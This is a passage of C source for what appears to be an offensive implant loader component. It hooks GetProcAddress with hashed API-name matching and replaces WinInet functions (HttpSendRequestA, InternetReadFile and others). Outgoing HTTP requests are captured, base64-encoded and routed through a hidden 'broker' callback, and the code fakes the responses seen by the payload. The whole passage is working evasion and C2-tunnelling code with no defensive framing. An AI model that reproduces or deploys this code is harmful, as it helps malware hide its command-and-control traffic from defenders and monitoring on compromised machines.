        PCONNECTION_CONTEXT conn = findConnection(hConnect);
        const char *scheme = (dwFlags & INTERNET_FLAG_SECURE) ? "https" : "http";
        const char *hostValue = conn && conn->host ? conn->host : "";
        INTERNET_PORT portValue = conn ? conn->port : 0;
        trackRequest(result, lpszVerb, scheme, hostValue, portValue, lpszObjectName);
        unlockContexts();
    }

    if (verbCopy)       KERNEL32$HeapFree(hHeap, 0, verbCopy);
    if (objectNameCopy) KERNEL32$HeapFree(hHeap, 0, objectNameCopy);
    if (versionCopy)    KERNEL32$HeapFree(hHeap, 0, versionCopy);
    if (referrerCopy)   KERNEL32$HeapFree(hHeap, 0, referrerCopy);

    return result;
}

/*
 * Intercept HttpSendRequestA, capture headers/body, base64‑encode the payload,
 * and hand it to customCallback. The broker decides how to actually issue the
 * request, and we cache the response for the rest of the WinInet pipeline.
 */
BOOL WINAPI _HttpSendRequestA(
    HINTERNET hRequest,
    LPCSTR    lpszHeaders,
    DWORD     dwHeadersLength,
    LPVOID    lpOptional,
    DWORD     dwOptionalLength
)
{
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    LPSTR  headersCopy = NULL;
    LPVOID optionalCopy = NULL;
    SIZE_T len = 0;
    SIZE_T i;

    if (lpszHeaders != NULL && dwHeadersLength != 0) {
        len = (dwHeadersLength == (DWORD)-1) ? MSVCRT$strlen(lpszHeaders) : dwHeadersLength;
        headersCopy = (LPSTR)KERNEL32$HeapAlloc(hHeap, 0, len + 1);
        if (headersCopy != NULL) {
            for (i = 0; i < len; ++i) {
                headersCopy[i] = lpszHeaders[i];
            }
            headersCopy[len] = '\0';
        }
    }

    if (lpOptional != NULL && dwOptionalLength > 0) {
        optionalCopy = KERNEL32$HeapAlloc(hHeap, 0, dwOptionalLength);
        if (optionalCopy != NULL) {
            for (i = 0; i < dwOptionalLength; ++i) {
                ((BYTE *)optionalCopy)[i] = ((BYTE *)lpOptional)[i];
            }
        }
    }

    BOOL handled = FALSE;
    lockContexts();
    PREQUEST_CONTEXT ctx = findRequest(hRequest);
    unlockContexts();

    if (ctx != NULL) {
        updateRequestHeaders(ctx, headersCopy);
        char *requestJson = buildRequestJson(ctx, headersCopy, (const BYTE *)optionalCopy, dwOptionalLength);
        if (requestJson != NULL) {
            DWORD reqJsonLen = (DWORD)MSVCRT$strlen(requestJson);
            char *encodedRequest = base64Encode((const BYTE *)requestJson, reqJsonLen);
            if (encodedRequest != NULL) {
                char *encodedResponse = customCallback(encodedRequest);
                if (encodedResponse != NULL) {
                    BYTE *responseJsonBuf = NULL;
                    DWORD responseJsonLen = 0;
                    if (base64Decode(encodedResponse, &responseJsonBuf, &responseJsonLen)) {
                        if (populateResponseFromJson(ctx, (const char *)responseJsonBuf)) {
                            handled = TRUE;
                        }
                        KERNEL32$HeapFree(hHeap, 0, responseJsonBuf);
                    }
                    KERNEL32$HeapFree(hHeap, 0, encodedResponse);
                }
                KERNEL32$HeapFree(hHeap, 0, encodedRequest);
            }
            KERNEL32$HeapFree(hHeap, 0, requestJson);
        }
    }

    if (handled) {
        if (headersCopy)   KERNEL32$HeapFree(hHeap, 0, headersCopy);
        if (optionalCopy)  KERNEL32$HeapFree(hHeap, 0, optionalCopy);
        return TRUE;
    }

    if (headersCopy)   KERNEL32$HeapFree(hHeap, 0, headersCopy);
    if (optionalCopy)  KERNEL32$HeapFree(hHeap, 0, optionalCopy);
    KERNEL32$SetLastError(ERROR_INTERNET_TIMEOUT);
    return FALSE;
}

/*
 * Serve subsequent HttpQueryInfoA reads from the cached response instead of
 * poking WinInet again, so the caller sees the exact headers/status the broker
 * provided.
 */
BOOL WINAPI _HttpQueryInfoA(
    HINTERNET hRequest,
    DWORD     dwInfoLevel,
    LPVOID    lpBuffer,
    LPDWORD   lpdwBufferLength,
    LPDWORD   lpdwIndex
)
{
    DWORD  bufferLengthLocal  = (lpdwBufferLength != NULL) ? *lpdwBufferLength : 0;
    DWORD  indexLocal         = (lpdwIndex != NULL) ? *lpdwIndex : 0;

    DWORD baseInfo = dwInfoLevel & 0x0000FFFF;
    BOOL flagNumber = (dwInfoLevel & HTTP_QUERY_FLAG_NUMBER) != 0;
    BOOL served = FALSE;

    lockContexts();
    PREQUEST_CONTEXT ctx = findRequest(hRequest);
    unlockContexts();

    if (ctx != NULL && ctx->response.statusCode != 0) {
        const char *stringValue = NULL;
        DWORD numericValue = 0;
        if (baseInfo == HTTP_QUERY_STATUS_CODE) {
            numericValue = ctx->response.statusCode;
            char statusBuf[16];
            int written = MSVCRT$sprintf(statusBuf, "%lu", (unsigned long)numericValue);
            statusBuf[written] = '\0';
            stringValue = statusBuf;
        }
        else if (baseInfo == HTTP_QUERY_STATUS_TEXT) {
            stringValue = ctx->response.statusText ? ctx->response.statusText : "";
        }
        else if (baseInfo == HTTP_QUERY_RAW_HEADERS || baseInfo == HTTP_QUERY_RAW_HEADERS_CRLF) {
            stringValue = ctx->response.headersBlock ? ctx->response.headersBlock : "";
        }
        else if (baseInfo == HTTP_QUERY_CONTENT_LENGTH) {
            numericValue = ctx->response.bodyLength;
            char lenBuf[24];
            int written = MSVCRT$sprintf(lenBuf, "%lu", (unsigned long)numericValue);
            lenBuf[written] = '\0';
            stringValue = lenBuf;
        }

        if (stringValue != NULL || flagNumber) {
            if (flagNumber) {
                DWORD required = sizeof(DWORD);
                if (lpdwBufferLength != NULL) {
                    *lpdwBufferLength = required;
                }
                if (lpBuffer != NULL && bufferLengthLocal >= required) {
                    *((DWORD *)lpBuffer) = numericValue;
                    served = TRUE;
                }
                else {
                    served = FALSE;
                }
            }
            else {
                DWORD required = (DWORD)MSVCRT$strlen(stringValue) + 1;
                if (lpdwBufferLength != NULL) {
                    *lpdwBufferLength = required;
                }
                if (lpBuffer != NULL && bufferLengthLocal >= required) {
                    for (DWORD i = 0; i < required; ++i) {
                        ((BYTE *)lpBuffer)[i] = ((const BYTE *)stringValue)[i];
                    }
                    served = TRUE;
                }
                else {
                    served = FALSE;
                }
            }
        }
    }

    if (served) {
        return TRUE;
    }

    if (lpdwBufferLength != NULL) {
        *lpdwBufferLength = 0;
    }
    if (lpdwIndex != NULL) {
        *lpdwIndex = indexLocal;
    }
    KERNEL32$SetLastError(ERROR_INTERNET_TIMEOUT);
    return FALSE;
}

/*
 * Report how many bytes arrived from the broker so callers that inspect this
 * information behave as if they had read from a real socket.
 */
BOOL WINAPI _InternetQueryDataAvailable(
    HINTERNET hFile,
    LPDWORD   lpdwNumberOfBytesAvailable,
    DWORD     dwFlags,
    DWORD_PTR dwContext
)
{
    DWORD available = 0;

    lockContexts();
    PREQUEST_CONTEXT ctx = findRequest(hFile);
    unlockContexts();

    if (ctx != NULL && ctx->response.body != NULL) {
        if (ctx->response.bodyLength > ctx->response.readOffset) {
            available = ctx->response.bodyLength - ctx->response.readOffset;
        }
        if (lpdwNumberOfBytesAvailable != NULL) {
            *lpdwNumberOfBytesAvailable = available;
        }
        return TRUE;
    }

    if (lpdwNumberOfBytesAvailable != NULL) {
        *lpdwNumberOfBytesAvailable = 0;
    }

    KERNEL32$SetLastError(ERROR_INTERNET_TIMEOUT);
    return FALSE;
}

/*
 * Feed the cached response body back to the caller instead of letting WinInet
 * touch the network; this keeps the standard HTTP read loop happy while the
 * broker handles the real I/O.
 */
BOOL WINAPI _InternetReadFile(
    HINTERNET hFile,
    LPVOID    lpBuffer,
    DWORD     dwNumberOfBytesToRead,
    LPDWORD   lpdwNumberOfBytesRead
)
{
    lockContexts();
    PREQUEST_CONTEXT ctx = findRequest(hFile);
    unlockContexts();

    if (ctx != NULL && ctx->response.body != NULL) {
        DWORD remaining = (ctx->response.bodyLength > ctx->response.readOffset) ? (ctx->response.bodyLength - ctx->response.readOffset) : 0;
        DWORD toCopy = (dwNumberOfBytesToRead < remaining) ? dwNumberOfBytesToRead : remaining;
        if (lpBuffer != NULL && toCopy > 0) {
            for (DWORD i = 0; i < toCopy; ++i) {
                ((BYTE *)lpBuffer)[i] = ctx->response.body[ctx->response.readOffset + i];
            }
        }
        ctx->response.readOffset += toCopy;
        if (lpdwNumberOfBytesRead != NULL) {
            *lpdwNumberOfBytesRead = toCopy;
        }
        return TRUE;
    }

    if (lpdwNumberOfBytesRead != NULL) {
        *lpdwNumberOfBytesRead = 0;
    }

    KERNEL32$SetLastError(ERROR_INTERNET_TIMEOUT);
    return FALSE;
}



char * WINAPI _GetProcAddress(HMODULE hModule, LPCSTR lpProcName)
{
    HMODULE hModuleLocal   = hModule;
    LPCSTR  lpProcNameLocal = lpProcName;
    HANDLE  hHeap          = KERNEL32$GetProcessHeap();
    BOOL    isOrdinal      = ((ULONG_PTR)lpProcNameLocal >> 16 == 0);
    LPSTR   procNameCopy   = NULL;
    SIZE_T  len;
    SIZE_T  i;
    const char * procNameForHash = lpProcNameLocal;

    if (lpProcNameLocal != NULL && isOrdinal == FALSE) {
        len = MSVCRT$strlen(lpProcNameLocal);
        procNameCopy = (LPSTR)KERNEL32$HeapAlloc(hHeap, 0, len + 1);
        if (procNameCopy != NULL) {
            for (i = 0; i <= len; ++i) {
                procNameCopy[i] = lpProcNameLocal[i];
            }
            procNameForHash = procNameCopy;
        }
    }

    //MSVCRT$printf("[hook] GetProcAddress called!\n");


    char * result = (char *)GetProcAddress(hModuleLocal, isOrdinal ? lpProcNameLocal : procNameCopy);

    /*
    * Check to see what function is being resolved.
    * Note that lpProcName may be an ordinal, not a string.
    */

    char * resolved = result;

    if (isOrdinal) {
        goto cleanup;
    }

    /* Look at the ones we want to hook */

    /* Calculte function hash */
    DWORD h = hash((char *)procNameForHash);

    if (h == GETPROCADDRESS_HASH) {
        resolved = (char *)_GetProcAddress;
    }
    else if (h == LOADLIBRARYA_HASH) {
        resolved = (char *)KERNEL32$LoadLibraryA;
    }
    else if (h == INTERNETOPENA_HASH) {
        g_InternetOpenA = result;
        resolved = (char *)_InternetOpenA;
    }
    else if (h == INTERNETCONNECTA_HASH) {
        g_InternetConnectA = result;
        resolved = (char *)_InternetConnectA;
    }
    else if (h == HTTPOPENREQUESTA_HASH) {
        g_HttpOpenRequestA = result;
        resolved = (char *)_HttpOpenRequestA;
    }
    else if (h == HTTPSENDREQUESTA_HASH) {
        resolved = (char *)_HttpSendRequestA;
    }
    else if (h == HTTPQUERYINFOA_HASH) {
        resolved = (char *)_HttpQueryInfoA;
    }
    else if (h == INTERNETQUERYDATAAVAILABLE_HASH) {
        resolved = (char *)_InternetQueryDataAvailable;
    }
    else if (h == INTERNETREADFILE_HASH) {
        resolved = (char *)_InternetReadFile;
    }

cleanup:
    if (procNameCopy != NULL) {
        KERNEL32$HeapFree(hHeap, 0, procNameCopy);
    }

    return resolved;
}

void go(IMPORTFUNCS * funcs, MEMORY_LAYOUT * layout)
{
    funcs->LoadLibraryA   = (__typeof__(LoadLibraryA)   *)KERNEL32$LoadLibraryA;
    funcs->GetProcAddress = (__typeof__(GetProcAddress) *)_GetProcAddress;

    if (layout != NULL) {
        g_layout = *layout;
    }



    initFrameInfo();
}
